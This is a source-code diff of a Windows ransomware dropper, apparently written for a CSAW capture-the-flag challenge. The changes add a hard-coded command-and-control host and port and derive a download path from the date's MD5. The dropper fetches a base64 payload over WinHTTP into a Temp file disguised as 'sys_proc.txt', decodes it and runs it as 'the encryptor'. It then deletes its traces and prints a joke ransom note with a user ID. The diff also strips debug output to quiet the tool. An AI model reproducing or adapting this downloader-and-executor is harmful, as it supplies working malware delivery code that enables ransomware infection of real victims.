@@ -8,7 +8,12 @@
 #include <winhttp.h>
 #include <Wincrypt.h>
 #include <fstream>
+#include <iostream>
 #pragma comment (lib, "Crypt32.lib")
+
+const WCHAR ccHost[] = L"192.168.56.102";
+const DWORD ccServerPort = 9000;
+
 
 wchar_t* md5sum(BYTE* input) {
     DWORD hash_len = 16;
@@ -23,23 +28,26 @@ wchar_t* md5sum(BYTE* input) {
         PROV_RSA_FULL,
         CRYPT_VERIFYCONTEXT))
     {
-        printf("CryptAcquireContext failed: %d\n", GetLastError());
+        //printf("CryptAcquireContext failed: %d\n", GetLastError());
+		exit(1);
     }
 
     // create MD5 hasher
     if (!CryptCreateHash(provider, CALG_MD5, 0, 0, &hasher))
     {
-        printf("CryptAcquireContext failed: %d\n", GetLastError());
+        //printf("CryptAcquireContext failed: %d\n", GetLastError());
         CryptReleaseContext(provider, 0);
+		exit(1);
     }
 
     // hash input data
     if (!CryptHashData(hasher, input, 16, 0)
         )
     {
-        printf("CryptHashData failed: %d\n", GetLastError());
+        //printf("CryptHashData failed: %d\n", GetLastError());
         CryptDestroyHash(hasher);
         CryptReleaseContext(provider, 0);
+		exit(1);
     }
 
     // get hash result
@@ -47,7 +55,8 @@ wchar_t* md5sum(BYTE* input) {
         hasher, HP_HASHVAL, hash, &hash_len, 0
     ))
     {
-        printf("CryptGetHashParam failed: %d\n", GetLastError());
+        //printf("CryptGetHashParam failed: %d\n", GetLastError());
+		exit(1);
     }
 
     // convert md5sum to char*
@@ -64,7 +73,8 @@ wchar_t* md5sum(BYTE* input) {
 
     // check for consistency:
     //printf("%s\n", hexstr);
-    wprintf(L"%s\n", wide_hexstr);
+	//wprintf(L"In dropper: hash = ");
+    //wprintf(L"%s\n", wide_hexstr);
 
     // destroy hasher and provider
     if (hasher)
@@ -95,30 +105,36 @@ int Base64Decode(LPCWSTR fileName) {
 	fileData = malloc(fileSize+1);
 	bErrorFlag = ReadFile(hFile, fileData, fileSize, &nBytesRead, NULL);
 	if (bErrorFlag == FALSE) {
+		free(fileData);
 		return -1;
 	}
 	if (nBytesRead != fileSize) {
+		free(fileData);
 		return -1;
 	}
 	// Close the file
 	BOOL fileClosed = CloseHandle(hFile);
 	if (!(fileClosed)) {
+		free(fileData);
 		return -1;
 	}
 
 	// Now base64 decode the data
-	printf("Successfully read the file. Size = %d bytes.\n", fileSize);
+	//printf("Successfully read the file. Size = %d bytes.\n", fileSize);
 	DWORD decodedDataLength; 
 	BOOL decodeSuccessful;
 	decodeSuccessful = CryptStringToBinaryA((LPCSTR)fileData, nBytesRead, CRYPT_STRING_BASE64, NULL, &decodedDataLength, NULL, NULL);
 	if (!(decodeSuccessful)) {
+		free(fileData);
 		return -1;
 	}
-	printf("Decoded data length = %d.\n", decodedDataLength);
+	//printf("Decoded data length = %d.\n", decodedDataLength);
 	PBYTE decodedData = (PBYTE) malloc(decodedDataLength);
 	
 	decodeSuccessful = CryptStringToBinaryA((LPCSTR)fileData, nBytesRead, CRYPT_STRING_BASE64, decodedData, &decodedDataLength, NULL, NULL);
 	if (!(decodeSuccessful)) {
+		free(decodedData);
+		free(fileData);
 		return -1;
 	}
 
@@ -126,6 +142,8 @@ int Base64Decode(LPCWSTR fileName) {
 	BOOL deleteSuccessful = DeleteFileW(fileName);
 	//BOOL deleteSuccessful = DeleteFileA(fileName);
 	if (!(deleteSuccessful)) {
+		free(decodedData);
+		free(fileData);
 		return -1;
 	}
 
@@ -133,6 +151,8 @@ int Base64Decode(LPCWSTR fileName) {
 	hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 	//hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
+		free(decodedData);
+		free(fileData);
 		return -1;
 	}
 	fileSize = decodedDataLength;
@@ -141,21 +161,62 @@ int Base64Decode(LPCWSTR fileName) {
 	bErrorFlag = WriteFile(hFile, decodedData, decodedDataLength, &nBytesWritten, NULL);
 	//bErrorFlag = WriteFile(hFile, fileData, fileSize, &nBytesRead, NULL);
 	if (bErrorFlag == FALSE) {
+		free(decodedData);
+		free(fileData);
 		return -1;
 	}
 	if (nBytesWritten != decodedDataLength) {
+		free(decodedData);
+		free(fileData);
 		return -1;
 	}
 	// Close the file
 	fileClosed = CloseHandle(hFile);
 	if (!(fileClosed)) {
+		free(decodedData);
+		free(fileData);
 		return -1;
 	}
-	printf("Successfully decoded the file.");
+	//printf("Successfully decoded the file.");
 
 	// Clean up
-	//free(decodedData);
-	//free(fileData);
+	free(decodedData);
+	free(fileData);
+	return 0;
+}
+
+int getUserID(WCHAR* userID) {
+	wchar_t* IDFileName = (wchar_t *)malloc(MAX_PATH * 2);
+
+	wcsncpy_s(IDFileName, MAX_PATH, _wgetenv(L"USERPROFILE"), (MAX_PATH - 35));
+	wcsncat_s(IDFileName, MAX_PATH, L"\\AppData\\Local\\Temp\\sys_procid.txt", 35);
+	FILE * IDFile;
+	WCHAR hashDigits[] = L"0123456789abcdef";
+
+	IDFile = _wfopen(IDFileName, L"rb");
+	if (!IDFile) {
+		// Unable to open file for reading
+		//fprintf(stderr, "ERROR: fopen error: %s\n", strerror(errno));
+		free(IDFileName);
+		return errno;
+	}
+
+	DWORD num_bytes_read = fread(userID, sizeof(WCHAR), 17, IDFile);
+	if (ferror(IDFile)) {
+		//fprintf(stderr, "ERROR: fread error: %s\n", strerror(errno));
+		free(IDFileName);
+		return errno;
+	}
+	fclose(IDFile);
+
+	// Delete the user ID file
+	BOOL deleteSuccessful = DeleteFileW(IDFileName);
+	if (!(deleteSuccessful)) {
+		free(IDFileName);
+		exit(1);
+	}
+	//printf("Deleted the user ID file.\n");
+	free(IDFileName);
 	return 0;
 }
 
@@ -179,37 +240,37 @@ void dropper(wchar_t* path) {
 
     // report any errors
     if (!hsession) {
-        printf("Error %d has occurred.\n", GetLastError());
+        //printf("Error %d has occurred.\n", GetLastError());
         exit(1);
     }
 
     // connect to http server 
     //LPCWSTR ip = L"159.65.217.16";
-	LPCWSTR ip = L"192.168.56.102";
+	//LPCWSTR ip = L"192.168.56.102";
     //hconnect = WinHttpConnect(hsession, ip, INTERNET_DEFAULT_HTTP_PORT, 0);
-	hconnect = WinHttpConnect(hsession, ip, 9000, 0);
+	hconnect = WinHttpConnect(hsession, ccHost, ccServerPort, 0);
 
     // report any errors
     if (!hconnect) {
-        printf("Error %d has occurred.\n", GetLastError());
+        //printf("Error %d has occurred.\n", GetLastError());
         exit(1);
 	}
-	else {
+	/*else {
 		printf("Connected to remote terminal.\n");
-	}
+	}*/
 	
 
     // open request to provided path
     wchar_t* new_path = new wchar_t[34];
     new_path[0] = L'/';
     memcpy(&new_path[1], path, 66);
-    wprintf(L"Path: %s\n", path);
-    wprintf(L"%s\n", new_path);
+    //wprintf(L"Path: %s\n", path);
+    //wprintf(L"%s\n", new_path);
     hrequest = WinHttpOpenRequest(hconnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
     // report any errors
     if (!hrequest) {
-        printf("Error %d has occurred.\n", GetLastError());
+        //printf("Error %d has occurred.\n", GetLastError());
         exit(1);
     }
 
@@ -220,7 +281,7 @@ void dropper(wchar_t* path) {
 
     // report any errors.
     if (!results) {
-        printf("Error %d has occurred.\n", GetLastError());
+        //printf("Error %d has occurred.\n", GetLastError());
         exit(1);
     }
     // end request and prepare to receive response
@@ -228,12 +289,12 @@ void dropper(wchar_t* path) {
 
 	// report any errors.
 	if (!results) {
-		printf("Error %d has occurred.\n", GetLastError());
+		//printf("Error %d has occurred.\n", GetLastError());
 		exit(1);
 	}
-	else {
+	/*else {
 		printf("Received response from server.\n");
-	}
+	}*/
 
 	// check for 200 status code 
 	DWORD sc = 0;
@@ -259,28 +320,29 @@ void dropper(wchar_t* path) {
 	wcsncpy(outFileName, _wgetenv(L"USERPROFILE"), (MAX_PATH -33));
 	
 	//strncat(outFileName, "\\AppData\\Local\\Temp\\sys_proc.txt", MAX_PATH);
-	wcsncat(outFileName, L"\\AppData\\Local\\Temp\\sys_proc.txt", MAX_PATH);
+	wcsncat(outFileName, L"\\AppData\\Local\\Temp\\sys_proc.txt", 33); 
 	//outFileName = strncat(getenv("USERPROFILE"), "\\AppData\\Local\\Temp\\sys_proc.txt", (MAX_PATH*2));
 	//file_out.open(strcat(getenv("USERPROFILE"), "\\AppData\\Local\\Temp\\sys_proc.txt"));
 	//exit(0);
 	file_out.open(outFileName);
-	//file_out.open("C:\\Users\\Ian\\AppData\\Roaming\\sys_proc.txt");
 	
 	if (file_out.fail()) {
-		printf("file failed to open\n");
+		//printf("file failed to open\n");
+		free(outFileName);
 		exit(1);
 	}
-	else {
-		printf("File opened...\n");
-	}
+	//else {
+	//	printf("File opened...\n");
+	//}
 
 	do
 	{
 		// check for available data
 		size = 0;
 		if (!WinHttpQueryDataAvailable(hrequest, &size)) {
-			printf("Error %u in WinHttpQueryDataAvailable.\n",
-				GetLastError());
+			//printf("Error %u in WinHttpQueryDataAvailable.\n",
+			//	GetLastError());
+			free(outFileName);
 			exit(1);
 		}
 
@@ -288,8 +350,9 @@ void dropper(wchar_t* path) {
 		buffer = new char[size + 1];
 		if (!buffer)
 		{
-			printf("Out of memory\n");
+			//printf("Out of memory\n");
 			size = 0;
+			free(outFileName);
 			exit(1);
 		}
 		else
@@ -297,10 +360,13 @@ void dropper(wchar_t* path) {
 			// zero buffer read the data
 			ZeroMemory(buffer, size + 1);
 			if (!WinHttpReadData(hrequest, (LPVOID)buffer,
-				size, &downloaded))
-				printf("Error %u in WinHttpReadData.\n", GetLastError());
+				size, &downloaded)) {
+				//printf("Error %u in WinHttpReadData.\n", GetLastError());
+				free(outFileName);
+				exit(1);
+			}
 			else {
-				printf("%s", buffer);
+				//printf("%s", buffer);
 				file_out.write(buffer, size);
 			}
 
@@ -318,7 +384,9 @@ void dropper(wchar_t* path) {
 	//Base64 Decode the file
 	//file_in.open(strcat(getenv("USERPROFILE"), "\\AppData\\Local\\Temp\\sys_proc.txt"));
 	if (Base64Decode(outFileName) != 0) {
-		printf("Error in reading sys_proc.txt");
+		//printf("Error in reading sys_proc.txt");
+		free(outFileName);
+		exit(1);
 	}
 
 	STARTUPINFO si;
@@ -329,34 +397,88 @@ void dropper(wchar_t* path) {
 	ZeroMemory(&pi, sizeof(pi));
 	if (!CreateProcessW(outFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
 	//if (!CreateProcessA(outFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-		printf("CreateProcess failed (%d).\n", GetLastError());
+		//printf("CreateProcess failed (%d).\n", GetLastError());
+		free(outFileName);
 		exit(1);
 	}
 	// Wait for the child process to exit.
 	WaitForSingleObject(pi.hProcess, INFINITE);
 	//ShellExecuteW(0, L"open", outFileName, NULL, NULL, NULL);
-	printf("Executed the encryptor.\n");
+	//printf("Executed the encryptor.\n");
+
+	// Read the user ID and delete that file
+	WCHAR userID[17];
+	BOOL gotUserID = getUserID(userID);
+	if (gotUserID != 0) {
+		free(outFileName);
+		exit(1);
+	}
 
 	// Delete the encryptor
 	// Delete the encoded file
 	BOOL deleteSuccessful = DeleteFileW(outFileName);
 	//BOOL deleteSuccessful = DeleteFileA(outFileName);
 	if (!(deleteSuccessful)) {
+		free(outFileName);
 		exit(1);
 	}
-	printf("Deleted the encryptor.\n");
+	//printf("Deleted the encryptor.\n");
 
 	// Print a scary message
-	printf("OH NOES!!!!\n");
-	printf("WE HAVE ENCRYPTED YOUR SECRET CSAW FILES AND YOU ARE NOW AT THE MERCY OF THE CAT BRIGADE.\n");
-	printf("WE ACCEPT PAYMENT IN FLAGS, MONTHLY INSTALLMENTS ARE ACCEPTABLE.\n");
-	printf("DON'T TRY TO GET YOUR DATA BACK BEFORE THE END OF THE CTF, OUR RANSOMWARE IS FOOLPROOF.\n");
-	printf("\n");
-	printf("MUAHAHAHAHAHA.\n");
+	std::cout << R"(
+MMWWMMWWWMWWWMMWWMMWWWMMWWMMWWWMMWWMMWWWMMWWMMWWWMMWWWMMWWWMWWWMMWWWMWWWMWWWMMWWWMMWWMMWWWMWWWMMWWMM
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNK0kxdoolllloodxk0KXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXOdc;'..               .';cokKNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWMWWWMWWWWWWWWWWWWMMWWWMWXko;.   ..',;:ccllllllcc:;,'..   .;lkKWMWWWWWWWWMWWWWWWWWWWWWMWWWWWWW
+MWWWWMWWWMWWWWMWWWMWWWMMWWWWXkc'   .':ldxkkkkkkkkkkkkkkkkkkxdl:,.   .cxXWMWWWMWWWMWWWWMWWWMWWWWMWWWM
+WWWWWWWMWWWMWWWWMWWWMWWWWWKo,   .;ldkkkkkOkOOOOOOOOOOOOOOOOOkkkkxo:'.  'o0WMWWMMWWWMMWWWMWWWMWWWWMWW
+MWWWWMWWWMWWWMWWWWMWWWMWKl.  .;lxkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOkkkxo;.  .c0WMWWWMWWWWMWWWMWWWMWWWWM
+WWMWWWWMWWWMWWWWMWWWMWXd.  .:dkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkdc.  .oKWWWWWMWWWWMWWWMWWWWWWW
+MWWWWMWWWMWWWMWWWWMWWO;  .:dkkkOOOOOOOOOOO0000000000000000OOOOOOOOOOOkkkd:.  ,kNWMWWWWMWWWMWWWMWWWWM
+WWWWWWWMWWWMWWWWWWWNx.  'okkkkOOOOOOOO000000000000000000000000OOOOOkkkkkkko,  .dNWWWWWWWMWWWMWWWWMWW
+WWWWWWWWWWWWWWWWWWNo.  ;xkkkkOOOOOO000000000000000000000000000000Od;..:xOkkx:. .lXWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWNd. .:xkkOOOOOOOO00000000K0KKKKKKKKKKKKKK0000000Ol.  'dOOkkxc. .lNWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWx.  :xkkOOOOOO00000Od;';o0KKKKKKKKKKKKKKKKKK00000OdllxOOOOkkx:. .dWWWWWWWWWWWWWWWWW
+WWWWWWWWWMWWWWWW0,  ,xkkOOOOOO000000k,   'kKKKKKKKXXKKKKKKKKKKK0000000OOOOOOkkx;  'OWWMWWWMWWWMWWWWW
+WWMWWWWMWWWMWWWNo  .lkkkOOOOO00000000d:,:d0XXXXXXXXXXXXXXKKKKKKK0000000OOOOOOkko.  lNWWWMWWWMWWWWMWW
+MWWWMMWWWMWWWMMK,  ;xkkOOOOOO000000KKKKKKKXXXXXXXXXXXXXXXXXKKKKKKK00000OOOOOOkkx:  '0MMWWWMWWWMWWWWM
+WWWWWWWMWWWMWWWk. .ckkkOOOOO0000000KKKKKKXXXXXXXNNNNXXKKK000000KKK000000OOOOOOkkl. .xWWMMWWWMWWWWMWW
+MWWWWMWWWMWWWMWd. .okkOOOOOO000000KKKKKKXXXXXX0kdlcc:;;;,,,,,;;;::lk0000OOOOOkkko.  oWWWWWMWWWWWWWWM
+WWWWWWWMWWWMWWWo  .okkOOOOOO000000KKKKKKXXKkl:,'.''',,;;;;;;;;;;,'.'oO00OOOOOOkkd.  lNWWMWWWMWWWWMWW
+WWWWWMWWWMWWWWWd. .okkOOOOOO000000KKKKKXKx;..,;;::::::::::::::::::;..d00OOOOOOkkd.  oWMWWWWWWWWWWWWM
+WWWWWWWWWWWWWWWk. .ckkkOOOOO000000KKKKKOc.';::;;;;;;;;;;;;;::::::::,.;O0OOOOOOkkl. .xWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWW0,  ;xkkOOOOOO000000KKKk;.,::;;;;;;;;;;;;;;;;;;:::::;.,k0OOOOOkkk:  '0WWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWNl  .okkOOOOOOO000000KO;.,::;;;;;;;;;;;;;;;;;;;;::::;.,xOOOOOOkkd.  cNWWWWWWWWWWWWWWW
+WWWWWWWMWWWMWWWW0,  ,xkkOOOOOOO000000c..;;;;;;;;;;;;,,,,;;;;;;;;:::;.,kOOOOOkkx;  'OWWWWMWWWMWWWWWWW
+MWWWWMWWWMWWWMMWWx. .:xkkOOOOOO00000x'.,;;::::::::::;;;,;;;;;;;;:::'.cOOOOOOkkc. .dNWMWWWWMWWWMMWWWM
+WWWWWWWMWWWMWWWWMNo. .cxkkOOOOOOO000l..;::::ccccccccc::;;;;;;;;:::;..oOOOOkkkc.  lXMWWWWMWWWMWWWWMWW
+MWWWMMWWWMWWWWMWWWNo. .:xkkOOOOOOOOOc.';:::cccllllcccc::;;;;;;:::;'.:kOOkkkx:.  lXWWWMMWWWMWWWWMWWWM
+WWMWWWWMWWWMWWWWMWWNd.  ,okkkOOOOOOOo..;:::cccccccccc:::;;;;,''.'',cxOOkkkd,  .oXWWMWWWWMWWWMWWWWWWW
+MWWWWMWWWMWWWMWWWWMWNO,  .:dkkkOOOOOk:..;:::::cc::::;,'...',,;cldxkOOkkkxc.  'kNWMWWWMWWWWMWWWMWWWWM
+WWWWWWWMWWWMWWWWWWWWWWKo.  .cdkkkkkOOkl'...''..'''',,;:cloxkOOOOOkkkkkxc.  .lKWWWWWWWWWWWWWWMWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWW0c.  .;oxkkkkOOxoc:::clodxxkkOOOOOOOOOOkkkkxo:.  .cOWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWW0l'  .':oxkkkkOOOOOOOOOOOOOOOOOOOkkkkkxo:'.  .l0NWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWXkc.   .,:ldxkkkkkkkkkkkkkkkkkkxdl:,.   .:xKWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+MWWWWWWWWMWWWWWWWWMWWWMWWWWMWWWXkl,.   ..',::cllooolllcc:;'..   .,cxKWWWMWWWWMWWWMWWWWWWWWMWWWWWWWWM
+WWMWWWWMWWWMWWWWMWWWMWWWMMWWMMWWWWNKko:,..                ..,:ox0NWWWWMWWWWMWWWMWWWMWWWWMWWWMWWWWMWW
+MWWWMWWWWMWWWMWWWWMWWWMWWWWMWWWMWWWMMWWNXKOxdollllllllodxk0XNWWWWWWWMWWWMWWWMMWWWMWWWMMWWWMWWWMWWWWM
+WWWWWWWMWWWMWWWWMWWWMWWWWMWWWMWWWMWWWWMWWWWWWWWMWWWWMMWWWMWWWMMWWWMWWWMWWWMWWWWMWWWMWWWWMWWWMWWWWMWW
+MWWWMWWWWMWWWMWWWWMWWWWWWWWMWWWWWWWWWWWWMWWWWWWWWWMWWWWMWWMMWWWMWWWWMWWWWMWWWWWWWWWWWWWWWWMWWWMWWWWM
+)" << '\n';
+	wprintf(L"");
+	wprintf(L"                                       O H   N O E S ! ! ! ! \n\n");
+	wprintf(L"");
+	wprintf(L"WE HAVE ENCRYPTED YOUR SECRET CSAW FILES WITH CSAWLOCKER.\n");
+	wprintf(L"WE ACCEPT PAYMENT IN FLAGS, MONTHLY INSTALLMENTS ARE ACCEPTABLE.\n");
+	wprintf(L"YOUR USER ID IS %s WHEN YOU CONTACT OUR CUSTOMER SERVICE DEPARTMENT.\n",userID);
+	wprintf(L"DON'T TRY TO GET YOUR DATA BACK BEFORE THE END OF THE CTF, OUR RANSOMWARE IS FOOLPROOF.\n");
+	wprintf(L"\n");
+	wprintf(L"P.S. MUAHAHAHAHAHA.\n");
 
 	// Clean up
 	//free((PVOID) outFileName);
-
+	free(outFileName);
 }
 
 
@@ -384,6 +506,7 @@ int main() {
     memcpy(&byte_array[12], &day, sizeof(DWORD));
 
     // confirm correct allocation
+	/*
     printf("%d %d %d %d\n", dow, mon, yr, day);
     printf("%08x\n", dow);
     printf("%08x\n", mon);
@@ -391,12 +514,13 @@ int main() {
     printf("%08x\n", day);
     for (int j = 0; j < 16; j++)
         printf("%02x ", byte_array[j]);
+	*/
 
     // get md5 conversion of the above date values
-    //wchar_t* path = md5sum(byte_array);
+    wchar_t* path = md5sum(byte_array);
 	// hard-coding for testing purposes
-	wchar_t* path = (wchar_t*) L"/b502dbd5118e523d57946fe58dce1c7c";
-    wprintf(L"Path: %s\n", path);
+	//wchar_t* path = (wchar_t*) L"/b502dbd5118e523d57946fe58dce1c7c";
+    //wprintf(L"Path: %s\n", path);
 
     // get executable from server if it's the correct day
     dropper(path);
